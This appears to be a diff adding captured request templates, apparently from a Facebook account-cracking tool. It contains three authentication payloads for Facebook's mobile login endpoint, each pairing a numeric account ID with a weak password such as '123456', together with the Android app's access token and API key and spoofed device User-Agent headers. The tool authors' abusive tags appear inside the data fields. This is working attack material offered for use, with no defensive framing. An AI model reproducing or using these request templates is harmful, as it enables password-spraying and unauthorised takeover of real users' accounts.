@@ -1,0 +1,26 @@
+#-MR.MAFIA-KIDS
+#-CAPTURE BY </> NOOR
+#-FILE-M1
+-------------------------------------------------------
+</> NOOR DATA : {'kids_xudina': '361cc533-b993-4b91-8989-0ea7f8be53b8', 'format': 'json', 'kids_bokachoda': 'd6096e84-2614-408d-a4eb-a1cf4bc91721', 'FUCKED_BY_ARAFAT': 'true', 'family_device_id': 'e4ed7457-9dc7-43ae-b325-8e961501ea3a', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100003349570101', 'password': '123456', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'locale': 'fr_DZ', 'client_country_code': 'DZ', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+-------------------------------------------------------
+</> NOOR HEADERS : {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': '[FBAN/FB4A;FBAV/232.0.0.34.107;FBBV/13941697;FBDM/{density=4.0,width=1440,height=5120};FBLC/pt_BR;FBRV/259569865;FBCR/GPRS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 11X;FBSV/14;FBOP/1;FBCA/x86_64;FBDK/Xiaomi/Mi 11X/Mi 11X:14/RP1A/816646:user/release-keys]', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'unknown', 'Connection': 'Keep-Alive'}
+-------------------------------------------------------
+</> NOOR URL : https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true
+-------------------------------------------------------
+#-FILE-M2
+-------------------------------------------------------
+</> NOOR DATA : {'kids_xudina': '33aab97e-4765-4e83-8a5f-1e1be4134cd1', 'format': 'json', '_kids_bokachoda_Capture': 'ea7c1098-bff2-41f1-b8f5-e3be521b1949', 'FUCKED_BY_ARAFAT': 'true', 'family_device_id': 'b3681852-6936-4f56-baa7-669237b0a79b', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100001861635063', 'password': '123456 123456', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'locale': 'fr_DZ', 'client_country_code': 'DZ', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+-------------------------------------------------------
+</> NOOR HEADERS : {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': '[FBAN/FB4A;FBAV/344.0.0.46.209;FBBV/39020328;FBDM/{density=1.5,width=3840,height=1920};FBLC/es_ES;FBRV/494163913;FBCR/CDMA;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Stylus 2024;FBSV/11;FBOP/1;FBCA/x86;FBDK/Motorola/Moto G Stylus 2024/Moto G Stylus 2024:11/UP1A/394686:user/release-keys]', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'unknown', 'Connection': 'Keep-Alive'}
+-------------------------------------------------------
+</> NOOR URL : https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true
+-------------------------------------------------------
+#-FILE-M3
+-------------------------------------------------------
+</> NOOR DATA : {'MAFIA': '17aa50a5-c0c1-456c-9e3e-e86f3998636d', 'format': 'json', 'MX_MAFIA': '49d729ec-9158-4607-a5ba-f045227b28a6', 'MAFIA_ARAFAT': 'true', 'family_device_id': '2a295f14-5c6f-447c-ab6b-b709861878bc', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100001085903793', 'password': '123456 123456', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'locale': 'fr_DZ', 'client_country_code': 'DZ', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
+-------------------------------------------------------
+</> NOOR HEADERS : {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': '[FBAN/FB4A;FBAV/299.0.0.3.208;FBBV/86501473;FBDM/{density=5.0,width=1280,height=1080};FBLC/pt_BR;FBRV/997608221;FBCR/4G;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Xperia 10 V;FBSV/16;FBOP/1;FBCA/arm64-v8a;FBDK/Sony/Xperia 10 V/Xperia 10 V:16/SP1A/170475:user/release-keys]', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'unknown', 'Connection': 'Keep-Alive'}
+-------------------------------------------------------
+</> NOOR URL : https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true
+-------------------------------------------------------
